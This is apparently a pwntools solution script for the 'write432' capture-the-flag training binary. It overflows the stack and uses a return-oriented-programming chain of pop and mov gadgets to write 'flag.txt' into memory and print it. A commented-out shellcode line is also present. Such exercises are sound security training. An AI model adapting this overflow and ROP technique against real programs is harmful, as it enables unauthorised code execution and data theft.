```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./write432
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './write432')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'

io = start()


io.recvline(b">")
payload = b"0"*44
mov_gadget =p32(0x8048543) #from ebp to edi 
pop_gadget = p32(0x80485aa) #pop edi then pop ebp
print_addr = p32(0x80483d0)
address_data=  p32(0x804A018)
add2= p32(0x804A01c) 
payload+=pop_gadget + address_data+b"flag" + mov_gadget +pop_gadget + add2 +b".txt" + mov_gadget + print_addr+p32(0x00)+ address_data    
io.send(payload)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```
